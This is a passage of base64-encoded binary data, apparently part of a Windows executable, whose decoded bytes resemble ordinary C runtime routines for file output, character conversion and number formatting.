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M9uLvYj4//+B5v//DwAD+Im9pPj//xPygeH/BwAAjQQZiYW4+P//6OInAABRUd0cJOjoKAAAWVnooU4AAIvIiY2Y+P//aiBfgfn///9/dAiB+QAAAIB1CDPAiYWY+P//i5W4+P//M9uLhaT4//+F9omFMP7//w+Vw4m1NP7//4OlXPz//wBDiZ0s/v//gfozBAAAD4LYAwAAg6WQ+v//AMeFlPr//wAAEADHhYz6//8CAAAAhfYPhPQBAAAzyYuEDZD6//87hA0w/v//D4XeAQAAg8EEg/kIdeSNgs/7//+Lz4vwM9KD4B/B7gUryImFuPj//zPAibW0+P//QImNkPj//+i2TQAAi4ydLP7//0iDpYz4//8AiYWo+P//99CJhaT4//8PvcF0A0DrAjPAjRQzK/iJvaz4//+JlZz4//+D+nN1DDm9uPj//3YEsQHrAjLJg/pzD4ftAAAAhMkPheUAAACD+nJyCWpyWomVnPj//4vKiY2g+P//g/r/D4SQAAAAi720+P//i/Ir942VMP7//40UsjvPcmc783MEiwLrAjPAiYWw+P//jUb/O8NzBYtC/OsCM8AjhaT4//+D6gSLjZD4//+LnbD4//8jnaj4///T6IuNuPj//9Pji42g+P//C8OJhI0w/v//SU6JjaD4//+D+f90CIudLP7//+uVi5Wc+P//i72s+P//i7W0+P//hfZ0EovOjb0w/v//M8Dzq4u9rPj//7vMAQAAOb24+P//dguNQgGJhSz+///rM4mVLP7//+srM8C7zAEAAFCJhYz6//+JhSz+//+NhZD6//9QjYUw/v//U1DoD83//4PEEIOllPr//wAzyWoEWEGJhZD6//+JjYz6//+JjVz8//9QjYWQ+v//UI2FYPz//1NQ6NjM//+DxBDp3QMAAI2Czvv//4vPi/Az0oPgH8HuBSvIiYW4+P//M8CJtbD4//9AiY2k+P//6OBLAACLjJ0s/v//SIOljPj//wCJhZD4///30ImFqPj//w+9wXQDQOsCM8CNFDMr+Im9rPj//4mVoPj//4P6c3UMOb24+P//dgSxAesCMsmD+nMPh+0AAACEyQ+F5QAAAIP6cnIJanJaiZWg+P//i8qJjZz4//+D+v8PhJAAAACLvbD4//+L8iv3jZUw/v//jRSyO89yZzvzcwSLAusCM8CJhbT4//+NRv87w3MFi0L86wIzwCOFqPj//4PqBIuNpPj//4udtPj//yOdkPj//9Poi424+P//0+OLjZz4//8Lw4mEjTD+//9JTomNnPj//4P5/3QIi50s/v//65WLvaz4//+LlaD4//+LtbD4//+F9nQSi86NvTD+//8zwPOri72s+P//u8wBAAA5vbj4//92C41CAYmFLP7//+sziZUs/v//6yszwLvMAQAAUImFjPr//4mFLP7//42FkPr//1CNhTD+//9TUOg5y///g8QQg6WU+v//ADPAQMeFkPr//wIAAACJhYz6//+JhVz8//9qBOkj/v//g/o1D4QSAQAAg6WQ+v//AMeFlPr//wAAEADHhYz6//8CAAAAhfYPhO8AAAAzyYuEDZD6//87hA0w/v//D4XZAAAAg8EEg/kIdeSDpYz4//8AD73GdANA6wIzwIvzK/iNhSz+//+JtaT4//+Lzo0EsImFqPj//4vwO8tzD4uUjTD+//+JlbT4///rB4OltPj//wCNQf87w3MEixbrAjPSi4W0+P//g+4EweoeweACC9CJlI0w/v//SYP5/3QIi50s/v//67OLtaT4//+D/wJzC41GAYmFLP7//+sGibUs/v//uzUEAACNhZD6//8rnbj4//+L+8HvBYv3weYCVmoAUOioJ///g+MfM8BAi8vT4ImENZD6///p0gAAAIuEnSz+//+DpYz4//8AD73AdANA6wIzwIvzK/iNhSz+//+JtaT4//+Lzo0EsImFqPj//4vwO8tzD4uUjTD+//+JlbT4///rB4OltPj//wCNQf87w3MEixbrAjPSi4W0+P//g+4EweofA8AL0ImUjTD+//9Jg/n/dAiLnSz+///rtIu1pPj//4P/AXMLjUYBiYUs/v//6waJtSz+//+7NAQAAI2FkPr//yuduPj//4v7we8Fi/fB5gJWagBQ6NEm//+D4x8zwECLy9PgiYQ1kPr//41HAbvMAQAAiYWM+v//iYVc/P//weACUI2FkPr//1CNhWD8//9TUOj2yP//g8Qci4WY+P//M9JqClmJjaT4//+FwA+IVAQAAPfxiYWQ+P//i8qJjXz4//+FwA+EYgMAAIP4JnYDaiZYD7YMhW6sQQAPtjSFb6xBAIv5iYWw+P//wecCV40EMYmFjPr//42FkPr//2oAUOglJv//i8bB4AJQi4Ww+P//D7cEhWysQQCNBIVoo0EAUI2FkPr//wPHUOibMf//i72M+v//g8QYg/8Bd3KLvZD6//+F/3UTM8CJhbz4//+JhVz8///plgIAAIP/AQ+EpQIAAIO9XPz//wAPhJgCAACLhVz8//8zyTP2i9iLx/ektWD8//8DwYmEtWD8//+D0gBGi8o783Xk6bAAAACJjIVg/P///4Vc/P//6VkCAACDvVz8//8BD4fHAAAAi7Vg/P//i8fB4AJQjYWQ+v//ibWo+P//UI2FYPz//4m9XPz//1NQ6KTH//+DxBCF9nUaM8CJhYz6//+JhVz8//9QjYWQ+v//6e4BAACD/gEPhPYBAACDvVz8//8AD4TpAQAAi4Vc/P//M8mLvaj4//8z9ovYi8f3pLVg/P//A8GJhLVg/P//g9IARovKO/N15LvMAQAAhckPhK4BAACLhVz8//+D+HMPgjT///8zwImFjPr//4mFXPz//1CNhZD6///p6AEAADu9XPz//42VkPr//w+SwHIGjZVg/P//iZW4+P//jY1g/P//hMB1Bo2NkPr//4mNtPj//4TAdAqLz4m9oPj//+sMi41c/P//iY2g+P//hMB0Bou9XPz//zPAM/aJhbz4//+FyQ+E+wAAAIM8sgB1HjvwD4XkAAAAg6S1wPj//wCNRgGJhbz4///pzgAAADPSi84hlaz4//+JlZz4//+F/w+EoQAAAIP5c3RkO8h1F4uFrPj//4OkjcD4//8AQAPGiYW8+P//i4Ws+P//i5W0+P//iwSCi5W4+P//9ySyA4Wc+P//g9IAAYSNwPj//4uFrPj//4PSAEBBiYWs+P//O8eJlZz4//+Lhbz4//91l4XSdDSD+XMPhLgAAAA7yHURg6SNwPj//wCNQQGJhbz4//+LwjPSAYSNwPj//4uFvPj//xPSQevIg/lzD4SEAAAAi42g+P//i5W4+P//RjvxD4UF////iYVc/P//weACUI2FwPj//1CNhWD8//9TUOiHxf//g8QQsAGEwHRyi4WQ+P//K4Ww+P//iYWQ+P//D4Wk/P//i418+P//hckPhAgFAACLBI0ErUEAiYV8+P//hcB1XTPAiYWc9v//iYVc/P//UOs6M8CJhZz2//+JhVz8//9QjYWg9v//UI2FYPz//1NQ6BPF//+DxBAywOuKg6Wc9v//AIOlXPz//wBqAI2FoPb//1CNhWD8///pkAQAAIP4AQ+EkQQAAIuNXPz//4XJD4SDBAAAM/8z9vektWD8//8Dx4mEtWD8//+LhXz4//+D0gBGi/o78XXghf8PhFcEAACLhVz8//+D+HMPg1H///+JvIVg/P///4Vc/P//6TYEAAD32PfxiYWg+P//i8qJjYz4//+FwA+EQQMAAIP4JnYDaiZYD7YMhW6sQQAPtjSFb6xBAIv5iYW4+P//wecCV40EMYmFjPr//42FkPr//2oAUOjPIf//i8bB4AJQi4W4+P//D7cEhWysQQCNBIVoo0EAUI2FkPr//wPHUOhFLf//i72M+v//g8QYg/8BD4eQAAAAi72Q+v//hf91GjPAiYWc9v//iYUs/v//UI2FoPb//+ltAgAAg/8BD4R1AgAAg70s/v//AA+EaAIAAIuFLP7//zPJM/aL2IvH96S1MP7//wPBiYS1MP7//4PSAEaLyjvzdeS7zAEAAIXJD4QzAgAAi4Us/v//g/hzD4PCAgAAiYyFMP7///+FLP7//+kSAgAAg70s/v//AQ+HgAAAAIu1MP7//4vHweACUI2FkPr//4m1fPj//1CNhTD+//+JvSz+//9TUOgsw///g8QQhfYPhDb///+D/gEPhMUBAACDvSz+//8AD4S4AQAAi4Us/v//M8mLvXz4//8z9ovYi8f3pLUw/v//A8GJhLUw/v//g9IARovKO/N15OlF////O70s/v//jZWQ+v//D5LAcgaNlTD+//+JlbD4//+NjTD+//+EwHUGjY2Q+v//iY2Q+P//hMB0CovPib2c+P//6wyLjSz+//+JjZz4//+EwHQGi70s/v//M8Az9omFvPj//4XJD4T7AAAAgzyyAHUeO/APheQAAACDpLXA+P//AI1GAYmFvPj//+nOAAAAM9KLziGVrPj//4mVtPj//4X/D4ShAAAAg/lzdGQ7yHUXi4Ws+P//g6SNwPj//wBAA8aJhbz4//+Lhaz4//+LlZD4//+LBIKLlbD4///3JLIDhbT4//+D0gABhI3A+P//i4Ws+P//g9IAQEGJhaz4//87x4mVtPj//4uFvPj//3WXhdJ0NIP5cw+ECAEAADvIdRGDpI3A+P//AI1BAYmFvPj//4vCM9IBhI3A+P//i4W8+P//E9JB68iD+XMPhNQAAACLjZz4//+LlbD4//9GO/EPhQX///+JhSz+///B4AJQjYXA+P//UI2FMP7//1NQ6FbB//+DxBCwAYTAD4TBAAAAi4Wg+P//K4W4+P//iYWg+P//D4XF/P//i42M+P//hckPhNMAAACLBI0ErUEAiYWM+P//hcAPhJgAAACD+AEPhLUAAACLjSz+//+FyQ+EpwAAADP/M/b3pLUw/v//A8eJhLUw/v//i4WM+P//g9IARov6O/F14IX/dH+LhSz+//+D+HNzTom8hTD+////hSz+///rZTPAUImFnPb//4mFLP7//42FoPb//1CNhTD+//9TUOiSwP//g8QQMsDpN////4OlnPb//wCDpSz+//8AagDrDzPAUImFLP7//4mFnPb//42FoPb//1CNhTD+//9TUOhTwP//g8QQi72U+P//i/eLjSz+//+JtbD4//+FyXR8agoz9jP/W4uEvTD+///34wPGiYS9MP7//4PSAEeL8jv5deSJtYz4//+F9ou1sPj//7vMAQAAdEKLjSz+//+D+XNzEYvCiYSNMP7///+FLP7//+smM8BQiYWc9v//iYUs/v//jYWg9v//UI2FMP7//1NQ6MG///+DxBCL/o2FXPz//1CNhSz+//9Q6Efq//9ZWYP4Cg+FlgAAAP+FmPj//413AYuFXPz//8YHMYm1sPj//4XAD4SKAAAAagoz/4vwM8lbi4SNYPz///fjA8eJhI1g/P//g9IAQYv6O8515Iu1sPj//7vMAQAAhf90VouFXPz//4P4c3MPibyFYPz///+FXPz//+s8M8BQiYWc9v//iYVc/P//jYWg9v//UI2FYPz//1NQ6A2///+DxBDrFIXAdQmLhZj4//9I6w0EMI13AYgHi4WY+P//i42A+P//iUEEi42E+P//hcB4CoH5////f3cCA8iLRRxIO8FyAovBA4WU+P//iYWE+P//O/APhMwAAACLhSz+//+FwA+EvgAAADP/i9gzyYuEjTD+//+6AMqaO/fiA8eJhI0w/v//g9IAQYv6O8t137vMAQAAhf90QIuFLP7//4P4c3MPibyFMP7///+FLP7//+smM8BQiYWc9v//iYUs/v//jYWg9v//UI2FMP7//1NQ6Di+//+DxBCNhVz8//9QjYUs/v//UOjA6P//WVmLjYT4//9qCF8rzjPS97Wk+P//gMIwO89yA4gUN0+D//916IP5CXYDaglZA/E7tYT4//8PhTT////GBgCAvXT4//8AX15bdA2NhWz4//9Q6LUVAABZi038M83oPwz//8nDaEitQQDrDGhArUEA6wVoOK1BAP91HIuNlPj//1HoRH3//4PEDIXAdQnrsGgwrUEA6+EzwFBQUFBQ6B6K///Mi/9Vi+xX/3UM6LOs//9Zi00Mi/iLSQyQ9sEGdR/oqIr//8cACQAAAItFDGoQWYPADPAJCIPI/+nWAAAAi0UMi0AMkMHoDKgBdA3oe4r//8cAIgAAAOvRi0UMi0AMkKgBdCj/dQzoXgMAAFmLTQyDYQgAhMCLRQx0sotIBIkIi0UMav5Zg8AM8CEIi0UMU2oCW4PADPAJGItFDGr3WYPADPAhCItFDINgCACLRQyLQAyQqcAEAAB1M1aLdQxqAejIQ///WTvwdA6LdQxT6LpD//9ZO/B1C1fohwMAAFmFwHUJ/3UM6FIXAABZXv91DItdCFPoNwEAAFlZhMB1EYtFDGoQWYPADPAJCIPI/+sDD7bDW19dw4v/VYvsV/91DOieq///WYtNDIv4i0kMkPbBBnUh6JOJ///HAAkAAACLRQxqEFmDwAzwCQi4//8AAOnYAAAAi0UMi0AMkMHoDKgBdA3oZIn//8cAIgAAAOvPi0UMi0AMkKgBdCj/dQzoRwIAAFmLTQyDYQgAhMCLRQx0sItIBIkIi0UMav5Zg8AM8CEIi0UMU1ZqAluDwAzwCRiLRQxq91mDwAzwIQiLRQyDYAgAi0UMi0AMkKnABAAAdTGLdQxqAeixQv//WTvwdA6LdQxT6KNC//9ZO/B1C1focAIAAFmFwHUJ/3UM6DsWAABZ/3UMi3UIVujtAAAAWVmEwHUTi0UMahBZg8AM8AkIuP//AADrAw+3xl5bX13Di/9Vi+xWV/91DOiEqv//WYtNDIvQi0kMkPbBwA+EkAAAAItNDDP/i0EEizEr8ECJAYtFDItIGEmJSAiF9n4ki0UMVv9wBFLokN///4PEDIv4i0UMO/6LSASKRQiIAQ+UwOtlg/r/dBuD+v50FovCi8qD4D/B+QZrwDgDBI3I8UEA6wW4+OBBAPZAKCB0w2oCV1dS6HcQAAAjwoPEEIP4/3Wvi0UMahBZg8AM8AkIsAHrFmoBjUUIUFLoHt///4PEDEj32BrA/sBfXl3Di/9Vi+xWV/91DOi4qf//WYtNDIvQi0kMkPbBwA+EkwAAAItNDDP/i0EEizEr8IPAAokBi0UMi0gYg+kCiUgIhfZ+I4tFDFb/cARS6MDe//+DxAyL+ItFDDv+i0gEZotFCGaJAethg/r/dBuD+v50FovCi8qD4D/B+QZrwDgDBI3I8UEA6wW4+OBBAPZAKCB0xGoCV1dS6KgPAAAjwoPEEIP4/3Wwi0UMahBZg8AM8AkIsAHrFWoCjUUIUFLoT97//4PEDIP4Ag+UwF9eXcOL/1WL7ItFCIPsEItADJDB6AOoAXQEsAHJw4tFCFNWi0AMkKjAi0UIdAeLCDtIBHROi0AQkFDotMD//4vwWYP+/3Q8M9uNRfhDU1BqAGoAVv8VZGBBAIXAdCWNRfBQVv8VYGBBAIXAdBaLRfg7RfB1CItF/DtF9HQCMtuKw+sCMsBeW8nDi/9Vi+xd6aj7//+L/1WL7F3psvz//4v/VYvsi00Ig/n+dQ3oVYb//8cACQAAAOs4hcl4JDsNyPNBAHMci8GD4T/B+AZryTiLBIXI8UEAD7ZECCiD4EBdw+gghv//xwAJAAAA6FiF//8zwF3Di/9Vi+xRUYtVDFaLdRAPt8pXhfZ1Bb4c9EEAgz4AjYEAJAAAD7fAdTy//wMAAGY7x3